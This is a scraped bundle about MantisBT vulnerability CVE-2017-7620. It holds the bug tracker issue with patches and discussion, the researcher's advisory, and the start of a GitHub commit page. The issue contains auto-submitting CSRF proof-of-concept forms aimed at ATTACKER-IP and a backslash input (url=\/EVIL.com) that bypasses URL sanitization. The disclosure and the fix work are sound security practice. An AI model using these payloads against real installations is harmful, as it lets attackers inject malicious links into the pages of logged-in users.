=== Content from mantisbt.org_df4e09dd_20250124_200637.html ===

Toggle sidebar [MantisBT](/bugs//) Toggle user menu

* mantisbt

  + - [All Projects](/bugs/set_project.php?project_id=0)
    - [mantisbt](/bugs/set_project.php?project_id=1)
    - [Mylyn Connector](/bugs/set_project.php?project_id=20)
    - [Plugin - agileMantis](/bugs/set_project.php?project_id=25)
    - [Plugin - CsvImport](/bugs/set_project.php?project_id=11)
    - [Plugin - CustomerManagement](/bugs/set_project.php?project_id=21)
    - [Plugin - EmailReporting](/bugs/set_project.php?project_id=10)
    - [Plugin - FilterPageEdit](/bugs/set_project.php?project_id=15)
    - [Plugin - InlineColumnConfiguration](/bugs/set_project.php?project_id=14)
    - [Plugin - LinkedCustomFields](/bugs/set_project.php?project_id=16)
    - [Plugin - MantisTouchRedirect](/bugs/set_project.php?project_id=22)
    - [Plugin - RecurrCall](/bugs/set_project.php?project_id=6)
    - [Plugin - RelatedIssuesExport](/bugs/set_project.php?project_id=13)
    - [Plugin - Reminder](/bugs/set_project.php?project_id=7)
    - [Plugin - Tasks](/bugs/set_project.php?project_id=8)
    - [Plugin - Time Tracking](/bugs/set_project.php?project_id=18)
* anonymous
  + [RSS](https://mantisbt.org/bugs/issues_rss.php)
  + [Logout](/bugs/logout_page.php)

* [My View](/bugs/my_view_page.php)
* [View Issues](/bugs/view_all_bug_page.php)
* [Change Log](/bugs/changelog_page.php)
* [Roadmap](/bugs/roadmap_page.php)
* [Wiki](/bugs/wiki.php?type=project&id=1)
* [Repositories](/bugs/plugin.php?page=Source/index)

* Anonymous
[Login](/bugs/login_page.php?return=%2Fbugs%2Fview.php%3Fid%3D22702)
[Signup for a new account](/bugs/signup_page.php)

#### View Issue Details

[Wiki](wiki.php?id=22702)[Related Changesets](#changesets)[Jump to Notes](#bugnotes)

|  | | | | | |
| --- | --- | --- | --- | --- | --- |
| ID | Project | Category | View Status | Date Submitted | Last Update |
| --- | --- | --- | --- | --- | --- |
| 0022702 | mantisbt | security | public | 2017-04-10 09:54 | 2017-05-20 16:10 |
|  | | | | | |
|
| Reporter | [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531) | Assigned To | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) |  | |
| Priority | high | Severity | major | Reproducibility | have not tried |
| Status | closed | Resolution | fixed |  | |
| Target Version | 1.3.11 | Fixed in Version | 1.3.11 |  | |
|  | | | | | |
|
| Summary | 0022702: CVE-2017-7620: CSRF - Arbitrary Permalink Injection | | | | |
| Description | CSRF to Link Injection vulnerability.  e.g.  <http://127.0.0.1/mantisbt-2.3.0/permalink_page.php?url=\/ATTACKER-IP>  Post the following HTML on remote web server and visit while logged into mantisbt.  ``` <form action="http://127.0.0.1/mantisbt-2.3.0/mantisbt-2.3.0/permalink_page.php?url=\/ATTACKER-IP" method="POST"> <script>document.forms[0].submit()</script> </form> ```  OR  ``` <form action="http://127.0.0.1/mantisbt-2.3.0/permalink_page.php?url=\/ATTACKER-IP%2Fmantisbt-2.3.0%2Fmantisbt-2.3.0%2Fsearch.php%3Fproject_id%3D1%26sticky%3Don%26sort%3Dlast_updated%26dir%3DDESC%26hide_status%3D90%26match_type%3D0" method="POST"> <script>document.forms[0].submit()</script> </form> ``` | | | | |
| Additional Information | Initially reported by John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org> via e-mail | | | | |
| Tags | No tags attached. | | | | |
| Attached Files | [0001-Add-form-security-token-to-permalink\_page.php.patch](file_download.php?file_id=7377&type=bug) (2,026 bytes)    ``` From 46e58463da2bb6726fc9c81abdffa2ed02b03865 Mon Sep 17 00:00:00 2001 From: Damien Regad <dregad@mantisbt.org> Date: Sun, 7 May 2017 11:34:04 +0200 Subject: [PATCH] Add form security token to permalink_page.php  Prevent CSRF / link injection (CVE-2017-7620)  Fixes #22702 ---  core/filter_api.php | 5 ++++-  permalink_page.php  | 4 ++++  2 files changed, 8 insertions(+), 1 deletion(-)  diff --git a/core/filter_api.php b/core/filter_api.php index ac6a630..bee19cd 100644 --- a/core/filter_api.php +++ b/core/filter_api.php @@ -2451,8 +2451,11 @@ function filter_draw_selection_area2( $p_page_number, $p_for_screen = true, $p_e  							filter_print_view_type_toggle( $t_url, $t_filter['_view_type'] );    							if( access_has_project_level( config_get( 'create_permalink_threshold' ) ) ) { +								# Add CSRF protection, see #22702 +								$t_permalink_url = urlencode( filter_get_url( $t_filter ) ) +									. form_security_param( 'permalink' );  								echo '<li>'; -								echo '<a href="permalink_page.php?url=' . urlencode( filter_get_url( $t_filter ) ) . '">'; +								echo '<a href="permalink_page.php?url=' . $t_permalink_url . '">';  								echo '<i class="ace-icon fa fa-link"></i>&#160;&#160;' . lang_get( 'create_filter_link' );  								echo '</a>';  								echo '</li>'; diff --git a/permalink_page.php b/permalink_page.php index 87a9058..b73ccab 100644 --- a/permalink_page.php +++ b/permalink_page.php @@ -36,6 +36,7 @@  require_once( 'core.php' );  require_api( 'access_api.php' );  require_api( 'config_api.php' ); +require_api( 'form_api.php' );  require_api( 'gpc_api.php' );  require_api( 'html_api.php' );  require_api( 'lang_api.php' ); @@ -43,6 +44,8 @@ require_api( 'print_api.php' );  require_api( 'string_api.php' );  require_api( 'utility_api.php' );   +form_security_validate( 'permalink' ); +  layout_page_header();    layout_page_begin(); @@ -75,4 +78,5 @@ if( !is_blank( $t_create_short_url ) ) {  ?>  </div>  <?php +form_security_purge( 'permalink' );  layout_page_end(); --  2.7.4   ```   [0001-Add-form-security-token-to-permalink\_page.php.patch](file_download.php?file_id=7377&type=bug) (2,026 bytes) | | | | |
|  | | | | | |
|

#### Relationships

[Relationship Graph](bug_relationship_graph.php?bug_id=22702&graph=relation)[Dependency Graph](bug_relationship_graph.php?bug_id=22702&graph=dependency)

| parent of | [0022909](view.php?id=22909) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | CVE-2017-7620: CSRF - Arbitrary Permalink Injection |
| --- | --- | --- | --- | --- |
| related to | [0022816](view.php?id=22816) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | CVE-2017-7620: Open redirection vulnerability in /login\_page.php |

#### Activities

| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-10 10:02  developer    [~0056475](view.php?id=22702#c56475 "Direct link to note") | [@hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531) I presume that you already requested a CVE ID ? Please post it here when it has been assigned. |
| --- | --- |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-10 12:17  reporter    [~0056481](view.php?id=22702#c56481 "Direct link to note") | CVE-2017-7620 |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-10 18:21  developer    [~0056485](view.php?id=22702#c56485 "Direct link to note")  Last edited: 2017-04-10 18:21 | [@hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531) I don't see any link injection... The `url` parameter is processed by *string\_sanitize\_url()*, which ensures that it is part of the Mantis site; as a result, the printed link is not actually redirecting to the attacker's site:   * if url=`<ip>`, it is treated as a relative to the mantisbt root (i.e. `http://localhost/mantisbt/<ip>`) * with an absolute url=`http://<ip>`, it is converted to `index.php`   Am I missing something ? If so, maybe you can explain what I'm doing wrong. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-10 20:35  reporter    [~0056486](view.php?id=22702#c56486 "Direct link to note") | Add this to a webpage on another server, login to mantis then visit the webpage. It works in 1.3.0 too. Attached is screenshot showing arbitrary link injection  <form action="<http://MANTIS-VICTIM-IP/mantisbt-2.3.0/mantisbt-2.3.0/permalink_page.php?url=\/SOME_OTHER_DOMAIN>" method="POST"> <script>document.forms[0].submit()</script> </form>   [mantis-csrf-link.jpg](file_download.php?file_id=7321&type=bug) (98,767 bytes)      [mantis-csrf-link.jpg](file_download.php?file_id=7321&type=bug) (98,767 bytes) |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-10 20:37  reporter    [~0056487](view.php?id=22702#c56487 "Direct link to note") | Look at bottom left of browser in screenshot to see URL status after hovering over link. <http://attacker-ip>. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-10 20:39  reporter    [~0056488](view.php?id=22702#c56488 "Direct link to note") | URL needs a backslash %5C or '\' to break your sanitation routine. e.g. url=\/EVIL.com |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-11 03:53  developer    [~0056489](view.php?id=22702#c56489 "Direct link to note") | Ah, I missed the backslash :-o Thanks for the clarification ! |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-13 02:42  developer    [~0056523](view.php?id=22702#c56523 "Direct link to note") | Sorry for the delay, I've been busy. I can confirm problem reproduction by escaping the `/`, now I need to think about how to properly address this issue (not sure at this time if patching *string\_sanitize\_url()* is the best way to do it). |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-13 19:06  developer    [~0056537](view.php?id=22702#c56537 "Direct link to note") | The identified vulnerability exists as far back as 1.2.0, and most likely long before that too; targeting at 1.3.10.  Proposed approach to fix the issue is to encode the `\` as `%5C` in string\_sanitize\_url(). As far as I can tell, this fixes the issue without regression.  Please review attached patch.   [0001-Encode-in-string\_sanitize\_url.patch](file_download.php?file_id=7330&type=bug) (1,155 bytes)    ``` From 35e78af20ba4bd5078934188635175d356f1e996 Mon Sep 17 00:00:00 2001 From: Damien Regad <dregad@mantisbt.org> Date: Fri, 14 Apr 2017 00:47:13 +0200 Subject: [PATCH] Encode '\' in string_sanitize_url()  John Page aka hyp3rlinx / ApparitionSec http://hyp3rlinx.altervista.org reported a CSRF vulnerability in permalink_page.php, allowing an attacker to inject arbitrary links (CVE-2017-7620).  Encoding the backslashes in the 'script' part of the URL ensures that the sanitized URL is treated as relative to MantisBT root and not a link to an external site.  Fixes #22702 ---  core/string_api.php | 3 ++-  1 file changed, 2 insertions(+), 1 deletion(-)  diff --git a/core/string_api.php b/core/string_api.php index 4e3c238..1c5e84b 100644 --- a/core/string_api.php +++ b/core/string_api.php @@ -275,7 +275,8 @@ function string_sanitize_url( $p_url, $p_return_absolute = false ) {  	}    	# Start extracting regex matches -	$t_script = $t_matches['script']; +	# Encode backslashes to prevent CSRF attacks +	$t_script = strtr( $t_matches['script'], array( '\\' => '%5C' ) );  	$t_script_path = $t_matches['path'];    	# Clean/encode query params --  2.7.4   ```   [0001-Encode-in-string\_sanitize\_url.patch](file_download.php?file_id=7330&type=bug) (1,155 bytes) |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-15 08:47  developer    [~0056561](view.php?id=22702#c56561 "Direct link to note") | [@hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531) are you OK with the proposed patch ? |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-15 13:06  reporter    [~0056567](view.php?id=22702#c56567 "Direct link to note") | basic tests seems to prevent valid URL being injected, but I do not see any CSRF token check your patch says "+ # Encode backslashes to prevent CSRF attacks" the CSRF still happens just the injection is now preceded with %5C. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-24 15:15  reporter    [~0056696](view.php?id=22702#c56696 "Direct link to note") | sent email last week for status update on this CSRF vulnerability but never heard back so I am follow up here. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-25 06:27  developer    [~0056703](view.php?id=22702#c56703 "Direct link to note") | Apologies for the lack of reply and delayed in resolving this issue, but due to work- and family-related priorities I had to put this aside. I will get back to it as soon as I can. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-04-25 20:28  reporter    [~0056711](view.php?id=22702#c56711 "Direct link to note") | Ok thanks for the update will check back with you soon. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-05-06 23:22  reporter    [~0056788](view.php?id=22702#c56788 "Direct link to note") | Checking back to see if fix is complete if not what is ETA, ... also just FYI Mantis passwords are stored using weak crypto MD5 and unsalted. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-07 03:48  developer    [~0056789](view.php?id=22702#c56789 "Direct link to note") | Checking back to see if fix is complete if not what is ETA  Funny you should ping me on that issue, as I actually resumed work on it yesterday.  passwords are stored using weak crypto MD5 and unsalted  Known issue, see [0022839](/bugs/view.php?id=22839 "[assigned] Deprecate MD5 login method and replace with BCRYPT hash"). In fact, I've been working on that over the past few days, expanding on the [work of a community contributor](https://github.com/mantisbt/mantisbt/pull/1048) feel free to have a look at the pull request and let us know your feedback if you can spare the time. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-07 06:13  developer    [~0056790](view.php?id=22702#c56790 "Direct link to note") | basic tests seems to prevent valid URL being injected the CSRF still happens just the injection is now preceded with %5C.  Escaping the backslash ensures that any external URL is redirected locally. If there is no possibility for an attacker to inject an exploitable URL, isn't it sufficient protection ? I'm not a security expert, so maybe I'm missing something; is there some other consideration or attack vector that I don't see ?  I do not see any CSRF token check  Adding it is trivial (see attached patch), but is it truly necessary ? |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-13 08:42  developer    [~0056845](view.php?id=22702#c56845 "Direct link to note") | [@hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531) any feedback before I merge and make this public ? |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-05-13 12:30  reporter    [~0056848](view.php?id=22702#c56848 "Direct link to note") | nope, when do you plan on making this public? |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-13 18:04  developer    [~0056849](view.php?id=22702#c56849 "Direct link to note") | I can do it anytime, really - patches are ready. If you need some advance notice, let me know what your constraints are. If you don't have any, I'll do it sometime tomorrow.  I was kind of hoping for an answer on the questions I raised in [0022702:0056790](/bugs/view.php?id=22702#c56790 "0022702: [2017-05-07 06:13] dregad") before moving forward, though. |
|  | |
| [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)   [hyp3rlinx](https://mantisbt.org/bugs/view_user_page.php?id=42531)  2017-05-16 16:47  reporter    [~0056871](view.php?id=22702#c56871 "Direct link to note") | Just following up on this... |
|  | |

#### Related Changesets

| MantisBT: master f21b56fa  2017-05-13 14:45  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23275) [Diff](https://github.com/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2) | Add form security token to permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection") |
| --- | --- | --- | --- |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2) [File](https://github.com/mantisbt/mantisbt/blob/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2/core/filter_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2) [File](https://github.com/mantisbt/mantisbt/blob/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2/permalink_page.php) |
| MantisBT: master f6644090  2017-05-13 14:47  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23276) [Diff](https://github.com/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b) | Encode '\' in string\_sanitize\_url() | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b) [File](https://github.com/mantisbt/mantisbt/blob/f66440902877103f312905257dbccdad02ab5a3b/core/string_api.php) |
| MantisBT: master 241ff4eb  2017-05-13 14:53  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23277) [Diff](https://github.com/mantisbt/mantisbt/commit/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62) | Add test for '\' encoding in in string\_sanitize\_url() | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection") |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62) [File](https://github.com/mantisbt/mantisbt/blob/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62/tests/Mantis/StringTest.php) |
| MantisBT: master-1.3.x c4f50e5d  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23273) [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/tests/Mantis/StringTest.php) |
| MantisBT: master-2.3 8b6787c8  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23274) [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/tests/Mantis/StringTest.php) |
| MantisBT: master-2.4 2d2309a3  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23280) [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/tests/Mantis/StringTest.php) |

**Powered by [MantisBT 2.28.0-dev-master-f0c253853](https://www.mantisbt.org "bug tracking software")**

Copyright © 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/bugs/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")

 Page execution time: 0.1908 seconds



=== Content from hyp3rlinx.altervista.org_12c9fa06_20250124_200636.html ===
[+] Credits: John Page a.k.a hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-CSRF-PERMALINK-INJECTION.txt
[+] ISR: ApparitionSec
Vendor:
================
www.mantisbt.org
Product:
=========
Mantis Bug Tracker
1.3.10 / v2.3.0
MantisBT is a popular free web-based bug tracking system. It is written in PHP works with MySQL, MS SQL, and PostgreSQL databases.
Vulnerability Type:
========================
CSRF Permalink Injection
CVE Reference:
==============
CVE-2017-7620
Security Issue:
================
Remote attackers can inject arbitrary permalinks into the mantisbt Web Interface if an authenticated user visits a malicious webpage.
Vuln code in "string\_api.php" PHP file, under mantis/core/ did not account for supplied backslashes.
Line: 270
# Check for URL's pointing to other domains
if( 0 == $t\_type || empty( $t\_matches['script'] ) ||
3 == $t\_type && preg\_match( '@(?:[^:]\*)?:/\*@', $t\_url ) > 0 ) {
return ( $p\_return\_absolute ? $t\_path . '/' : '' ) . 'index.php';
}
# Start extracting regex matches
$t\_script = $t\_matches['script'];
$t\_script\_path = $t\_matches['path'];
Exploit/POC:
=============

OR

Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
=============================
Vendor Notification: April 9, 2017
Vendor Release Fix: May 15, 2017
Vendor Disclosed: May 20, 2017
May 20, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx

=== Content from github.com_29aa8f39_20250126_031511.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff21b56fa9060dbae9438b0d0dfb21dff090c1dd2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff21b56fa9060dbae9438b0d0dfb21dff090c1dd2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
